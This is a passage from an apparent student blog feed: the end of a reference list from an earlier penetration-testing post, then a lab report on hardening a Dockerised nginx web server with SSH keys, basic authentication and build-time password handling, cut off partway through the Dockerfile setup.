<p>Code Zen. Defeating HTTP Basic Auth with Hydra. <a href="https://tylerrockwell.github.io/defeating-basic-auth-with-hydra">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>GeeksforGeeks. How to use Hydra to BruteForce SSH Connections? <a href="https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections">source</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>Ask Ubuntu. What does 2&gt;/dev/null mean? <a href="https://askubuntu.com/questions/350208/what-does-2-dev-null-mean">source</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>GeeksforGeeks. find command in Linux Linux Tutorial. <a href="https://www.geeksforgeeks.org/find-command-in-linux-with-examples">source</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>Uppin, C. M. Series of CTF machines Walkthrough #4 Linux Privilege Escalation (Enumeration). <a href="https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privilege-escalation-enumeration-247899027be">source</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>Delinea. Linux Privilege Escalation. <a href="https://delinea.com/blog/linux-privilege-escalation">source</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>Uppin, C. M. Series of CTF machines Walkthrough #5 Linux Privilege Escalation using Kernel Exploit. <a href="https://cmuppin9.medium.com/series-of-ctf-machines-walkthrough-5-linux-privilege-escalation-using-kernel-exploit-e188970fb905">source</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>Uppin, C. M. Series of CTF machines Walkthrough #7 Linux Privilege Escalation using SUID permissions. <a href="https://cmuppin9.medium.com/series-of-ctf-machines-walkthrough-7-linux-privilege-escalation-using-suid-permissions-7f82335e7547">source</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>Uppin, C. M. Series of CTF machines Walkthrough #6 Linux Privilege Escalation using SUDO permissions. <a href="https://cmuppin9.medium.com/series-of-ctf-machines-walkthrough-6-linux-privilege-escalation-using-sudo-permissions-c517cb789bc6">source</a>&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
<p>linux-smart-enumeration. <a href="https://github.com/diego-treitos/linux-smart-enumeration">source</a>&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>Qualys Corporation. Linux Kernel - &rsquo;ldso_hwcap Stack Clash&rsquo; Local Privilege Escalation. <a href="https://www.exploit-db.com/exploits/42274">source</a>&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:17">
<p>metasploit-framework/documentation/modules/payload/linux/x86/meterpreter/reverse_tcp.md at master · rapid7/metasploit-framework. <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/linux/x86/meterpreter/reverse_tcp.md">source</a>&#160;<a href="#fnref:17" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:18">
<p>drd_. Null Byte. <a href="https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463">source</a>&#160;<a href="#fnref:18" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:19">
<p>Metasploit Documentation. How to use msfvenom. <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">source</a>&#160;<a href="#fnref:19" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:20">
<p>LinuxConfig. Recover - Reset Forgotten Linux Root Password. <a href="https://linuxconfig.org/recover-reset-forgotten-linux-root-password">source</a>&#160;<a href="#fnref:20" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Hardening a Linux Webserver</title>
      <link>http://localhost:1313/posts/itsi/year-3/exercise-6/linux-hadening-nginx/</link>
      <pubDate>Sat, 04 Jan 2025 03:33:09 +0100</pubDate>
      <guid>http://localhost:1313/posts/itsi/year-3/exercise-6/linux-hadening-nginx/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex6/GNU_Linux_Securing_Active_Components.pdf&#34;&gt;here&lt;/a&gt; along with the &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex6/quellen.bib&#34;&gt;bibliography&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;exercise-6-gnulinux---securing-active-components&#34;&gt;Exercise 6: GNU/Linux - Securing active components&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Laboratory protocol&lt;/strong&gt;&lt;br&gt;
Exercise 6: GNU/Linux - Securing active components&lt;br&gt;
&lt;figure&gt;
    &lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/itsi/y3/ex6/images/mika.png&#34;/&gt; &lt;figcaption&gt;
            Figure: Grouplogo
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;strong&gt;Subject:&lt;/strong&gt; ITSI&lt;br&gt;
&lt;strong&gt;Class:&lt;/strong&gt; 3AHITN&lt;br&gt;
&lt;strong&gt;Name:&lt;/strong&gt; Stefan Fürst, Marcel Raichle&lt;br&gt;
&lt;strong&gt;Group Name/Number:&lt;/strong&gt; Team 7/7&lt;br&gt;
&lt;strong&gt;Supervisor:&lt;/strong&gt; SPAC, ZIVK&lt;br&gt;
&lt;strong&gt;Exercise dates:&lt;/strong&gt; 6.12.2024, 13.12.2024, 20.12.2024, 3.1.2025, 4.1.2025, 5.1.2025&lt;br&gt;
&lt;strong&gt;Submission date:&lt;/strong&gt; 4.1.2025&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#task-definition&#34;&gt;Task definition&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#task-0---preparation&#34;&gt;Task 0 - Preparation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#task-1--installing-a-web-server&#34;&gt;Task 1 – Installing a Web Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#task-2--securing-with-basic-authentication&#34;&gt;Task 2 – Securing with Basic Authentication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#task-3--encrypting-with-https&#34;&gt;Task 3 – Encrypting with HTTPS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#bonus-task--local-dns-setup-optional&#34;&gt;Bonus Task – Local DNS Setup (Optional)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#summary&#34;&gt;Summary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#complete-network-topology-of-the-exercise&#34;&gt;Complete network topology of the exercise&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exercise-execution&#34;&gt;Exercise Execution&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#preparation&#34;&gt;Preparation&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#testing-the-ssh-connectivity&#34;&gt;Testing the SSH connectivity&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#changes-to-the-docker-setup&#34;&gt;Changes to the Docker setup&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#installing-an-active-component&#34;&gt;Installing an active component&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#setting-up-php-fpm-with-nginx&#34;&gt;Setting up PHP-FPM with Nginx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#securing-nginx-with-basic-authentication&#34;&gt;Securing Nginx with Basic Authentication&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#creating-a-password-file&#34;&gt;Creating a Password File&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#configuring-the-authentication-in-nginx-and-testing-it&#34;&gt;Configuring the authentication in Nginx and testing it&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#configuring-https-with-self-signed-certificates&#34;&gt;Configuring HTTPS with Self-Signed Certificates&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#adding-a-domain&#34;&gt;Adding a Domain&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#references&#34;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;task-definition&#34;&gt;Task definition&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Task 0 - Preparation&lt;/strong&gt;&lt;br&gt;
Ensure your server from Exercises 4 and 5 is configured with SSH. Verify that you can connect to the server via SSH using a client with a GUI.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex6/GNU_Linux_Securing_Active_Components.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex6/quellen.bib">bibliography</a>.</p></blockquote>
<hr>
<h1 id="exercise-6-gnulinux---securing-active-components">Exercise 6: GNU/Linux - Securing active components</h1>
<hr>
<p><strong>Laboratory protocol</strong><br>
Exercise 6: GNU/Linux - Securing active components<br>
<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/mika.png"/> <figcaption>
            Figure: Grouplogo
        </figcaption>
</figure>

<strong>Subject:</strong> ITSI<br>
<strong>Class:</strong> 3AHITN<br>
<strong>Name:</strong> Stefan Fürst, Marcel Raichle<br>
<strong>Group Name/Number:</strong> Team 7/7<br>
<strong>Supervisor:</strong> SPAC, ZIVK<br>
<strong>Exercise dates:</strong> 6.12.2024, 13.12.2024, 20.12.2024, 3.1.2025, 4.1.2025, 5.1.2025<br>
<strong>Submission date:</strong> 4.1.2025</p>
<hr>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#task-definition">Task definition</a>
<ul>
<li><a href="#task-0---preparation">Task 0 - Preparation</a></li>
<li><a href="#task-1--installing-a-web-server">Task 1 – Installing a Web Server</a></li>
<li><a href="#task-2--securing-with-basic-authentication">Task 2 – Securing with Basic Authentication</a></li>
<li><a href="#task-3--encrypting-with-https">Task 3 – Encrypting with HTTPS</a></li>
<li><a href="#bonus-task--local-dns-setup-optional">Bonus Task – Local DNS Setup (Optional)</a></li>
</ul>
</li>
<li><a href="#summary">Summary</a></li>
<li><a href="#complete-network-topology-of-the-exercise">Complete network topology of the exercise</a></li>
<li><a href="#exercise-execution">Exercise Execution</a>
<ul>
<li><a href="#preparation">Preparation</a>
<ul>
<li><a href="#testing-the-ssh-connectivity">Testing the SSH connectivity</a></li>
<li><a href="#changes-to-the-docker-setup">Changes to the Docker setup</a></li>
</ul>
</li>
<li><a href="#installing-an-active-component">Installing an active component</a>
<ul>
<li><a href="#setting-up-php-fpm-with-nginx">Setting up PHP-FPM with Nginx</a></li>
</ul>
</li>
<li><a href="#securing-nginx-with-basic-authentication">Securing Nginx with Basic Authentication</a>
<ul>
<li><a href="#creating-a-password-file">Creating a Password File</a></li>
<li><a href="#configuring-the-authentication-in-nginx-and-testing-it">Configuring the authentication in Nginx and testing it</a></li>
</ul>
</li>
<li><a href="#configuring-https-with-self-signed-certificates">Configuring HTTPS with Self-Signed Certificates</a></li>
<li><a href="#adding-a-domain">Adding a Domain</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<hr>
<h2 id="task-definition">Task definition</h2>
<p><strong>Task 0 - Preparation</strong><br>
Ensure your server from Exercises 4 and 5 is configured with SSH. Verify that you can connect to the server via SSH using a client with a GUI.</p>
<p><strong>Task 1 – Installing a Web Server</strong><br>
Install a web server (e.g., Apache or Nginx) and deploy a static HTML page displaying your group number, team members, and an AI-generated image. (Bonus: Deploy a dynamic PHP page.) Demonstrate access to the page from a client browser.</p>
<p><strong>Task 2 – Securing with Basic Authentication</strong><br>
Set up Basic Authentication on the server. Create user accounts in the format <code>nnv-webuser</code> and for your instructors (e.g., <code>zivk-webuser</code>). Demonstrate authentication functionality. (Bonus: Capture the password using Wireshark.)</p>
<p><strong>Task 3 – Encrypting with HTTPS</strong><br>
Enable HTTPS with a self-signed certificate, including your group number. Demonstrate encrypted access and explain potential issues. Install the certificate on a client to show why this action is not required in the public internet.</p>
<p><strong>Bonus Task – Local DNS Setup (Optional)</strong><br>
Set up DNS on the server using <code>bind9</code> for local access via <code>xxx.itsi3.local</code>. Demonstrate DNS resolution and access the website by domain name.<!-- raw HTML omitted -->ChatGPT<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
<hr>
<h2 id="summary">Summary</h2>
<p>As preparation for the exercise, I optimized the Docker workflow by using Docker Compose for easier management, improved the readability of the Dockerfile, and, most importantly, created a <code>.env</code> file along with a build script that utilizes it, so I no longer hardcode my passwords in the Dockerfile. Additionally, I disabled password authentication and now copy the <code>authorized_keys</code> file into the container, allowing for key-based authentication from the start and enabling me to disable password authentication.</p>
<p>We need to install a web server, for which I chose <code>nginx</code>. I used it in conjunction with <code>php-fpm</code> to deploy a dynamic PHP webpage. The webpage includes our group number, names, and an AI-generated image. However, since this information should only be accessible with credentials, I implemented Basic Authentication to secure it. For this, the <code>apache2-utils</code> package was used to generate a <code>.htpasswd</code> file containing the credentials.</p>
<p>We demonstrated with Wireshark that the credentials were transmitted in plain text while using HTTP. To address this, a self-signed SSL certificate was generated using <code>openssl</code>, with the group number included in the <code>OU</code> field of the certificate. The server was then configured to use HTTPS. We showed that the credentials could no longer be read with Wireshark, as the traffic was now encrypted.</p>
<p>Lastly, we set up a domain, created a DNS record to point to the server, and generated a proper SSL certificate with Let&rsquo;s Encrypt, ensuring it is trusted and does not display a warning in the browser.</p>
<hr>
<h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise</h2>
<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/topology.png"/> <figcaption>
            Figure 1: Network topology of this exercise
        </figcaption>
</figure>

<hr>
<h2 id="exercise-execution">Exercise Execution</h2>
<h3 id="preparation">Preparation</h3>
<p>The requirements for this exercise are a headless Linux server with hardened SSH, which only allows connections via key pairs. However, I removed the OTP authentication added in the last exercise, as it was overkill for this use case and became a burden to use.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/sshnopw.png"/> <figcaption>
            Figure 2: Password authentication disabled
        </figcaption>
</figure>

<h4 id="testing-the-ssh-connectivity">Testing the SSH connectivity</h4>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/nokey.png"/> <figcaption>
            Figure 3: No SSH key available
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/yeskey.png"/> <figcaption>
            Figure 4: ram-fus authenticating via SSH key
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/yeskey2.png"/> <figcaption>
            Figure 5: ram-ram authenticating via SSH key
        </figcaption>
</figure>
</p>
<hr>
<h4 id="changes-to-the-docker-setup">Changes to the Docker setup</h4>
<p>To improve the quality of life when working on this project, I switched from aliasing a long and hard-to-read run command to using Docker Compose, which allows you to define and run multi-container applications. Since it&rsquo;s in a YAML file, it is more readable and easier to work with, even in this use case where I only have one container.<!-- raw HTML omitted -->Docker-Compose<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">webserver</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">itsi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">itsi:latest</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">restart</span>: <span style="color:#66d9ef">no</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#e6db74">&#34;38452:38452&#34;</span>
</span></span><span style="display:flex;"><span>        - <span style="color:#e6db74">&#34;80:80&#34;</span>
</span></span><span style="display:flex;"><span>        - <span style="color:#e6db74">&#34;443:443&#34;</span>
</span></span></code></pre></div><p>Furthermore, instead of having all of the credentials in the Dockerfile, I created a <code>.env</code> file in which the passwords are set. To utilize that, I made a build script that passes the variables from the file to the Dockerfile.<!-- raw HTML omitted -->docker-arg<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>export <span style="color:#66d9ef">$(</span>cat .env | xargs<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>docker buildx build -t itsi:latest<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg ROOT_PW<span style="color:#f92672">=</span>$ROOT_PW <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg RAM_WEBUSER_PW<span style="color:#f92672">=</span>$RAM_WEBUSER_PW <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg ZIVK_WEBUSER_PW<span style="color:#f92672">=</span>$ZIVK_WEBUSER_PW <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg RAM_FUS_PW<span style="color:#f92672">=</span>$RAM_FUS_PW <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg RAM_RAM_PW<span style="color:#f92672">=</span>$RAM_RAM_PW <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg RAM_ALOIS_PW<span style="color:#f92672">=</span>$RAM_ALOIS_PW <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg RAM_CHRIS_PW<span style="color:#f92672">=</span>$RAM_CHRIS_PW <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	--build-arg RAM_BERTA_PW<span style="color:#f92672">=</span>$RAM_BERTA_PW .
</span></span></code></pre></div><p>These build-time arguments are referenced in the Dockerfile like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">ARG</span> ROOT_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> RAM_WEBUSER_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> ZIVK_WEBUSER_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> RAM_FUS_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> RAM_RAM_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> RAM_ALOIS_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> RAM_CHRIS_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> RAM_BERTA_PW<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>...<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo <span style="color:#e6db74">&#39;root:$ROOT_PW&#39;</span> | chpasswd<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>...<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Here is what the <code>.env</code> file looks like for this project:</p>
<pre tabindex="0"><code>ROOT_PW=&#39;some password&#39;
...
</code></pre><p>Note that the quotes are only necessary if the password contains characters like <code>&amp;</code>, which the shell will interpret.</p>
<p>With this change, I can add the <code>.env</code> file to my <code>.gitignore</code> file so I don&rsquo;t accidentally commit my passwords again and handle passwords in a Dockerfile properly.</p>
<p>To still utilize my alias script, I changed every instance of <code>docker run</code> to <code>docker compose up -d</code>, <code>docker stop itsi &amp;&amp; docker rm itsi</code> to <code>docker compose down</code>, and added the use of the build script to it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>alias relaunch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sh -c &#39;docker stop itsi &amp;&amp; docker rm itsi &amp;&amp;\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		       ./build.sh &amp;&amp;\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		       docker compose up -d &amp;&amp; docker exec -it itsi /bin/bash&#39;&#34;</span>
</span></span><span style="display:flex;"><span>alias rebuild<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sh -c &#39;./build.sh &amp;&amp;\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                      docker compose up -d &amp;&amp; docker exec -it itsi /bin/bash&#39;&#34;</span>
</span></span><span style="display:flex;"><span>alias stop<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sh -c &#39;docker compose down&#39;&#34;</span>
</span></span></code></pre></div><p>Furthermore, instead of having to upload my container every time I rebuild, I added these three lines to copy the <code>authorized_keys</code> file with the devices I use to the container, so that every time I relaunch, I can just immediately SSH into it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">COPY</span> ./mapped-files/authorized_keys /root/.ssh/authorized_keys<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> ./mapped-files/authorized_keys /home/ram-fus/.ssh/authorized_keys<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> ./mapped-files/authorized_keys /home/ram-ram/.ssh/authorized_keys<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Lastly, the line in the Dockerfile that specifies the exposed ports is edited to expose ports 80 and 443, as they will be required for this exercise.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 38452 80 443</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><hr>
<h3 id="installing-an-active-component">Installing an active component</h3>
<p>Now, it&rsquo;s required to install a web server. I chose Nginx because I am most familiar with it, and due to its high performance and simplicity of use.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> apt install -y nginx<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>...<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> service ssh start <span style="color:#f92672">&amp;&amp;</span> service nginx start <span style="color:#f92672">&amp;&amp;</span> tail -F /dev/null<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>After modifying the Dockerfile, rebuilding, and redeploying, if we now open the web browser and go to the server&rsquo;s IP, we see the following.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex6/images/nginx.png"/> <figcaption>
            Figure 6: Default nginx site
        </figcaption>
</figure>

<p>The HTML site displayed is located at <code>/var/www/html/index.nginx-debian.html</code>.<br>
Additionally, I replaced the <code>/var/www/html</code> directory with <code>/var/www/metyr.xyz</code>, in which I have the following file structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">`</span>-- html
</span></span><span style="display:flex;"><span>   |-- private
</span></span><span style="display:flex;"><span>   |   <span style="color:#e6db74">`</span>-- private.php
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">`</span>-- public
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">`</span>-- index.php
</span></span></code></pre></div><p>These two directories are mapped onto the Docker container in the <code>docker-compose.yml</code> file, as shown below. Since they are mapped, every time the files are changed on the host, the changes carry over to the container, allowing for an easy and fast development workflow without the need to exec into the container or copy the files when creating the image.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">./mapped-files/public:/var/www/html/public:rw</span>
</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">./mapped-files/private:/var/www/html/private:rw</span>
</span></span></code></pre></div><p>Additionally, I edited the Dockerfile to delete the default Nginx configuration file, located at <code>/etc/nginx/sites-enabled/default</code>, a symlink to the file <code>/etc/nginx/sites-available/default.conf</code>, and replaced it with one matching my domain name for better readability.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> rm -rf /var/www/html/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /var/www/metyr.xyz/html<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm /etc/nginx/sites-available/default<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm /etc/nginx/sites-enabled/default<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> ./mapped-files/metyr.xyz /etc/nginx/sites-available/metyr.xyz<span style="color:#960050;background-color:#1e0010">
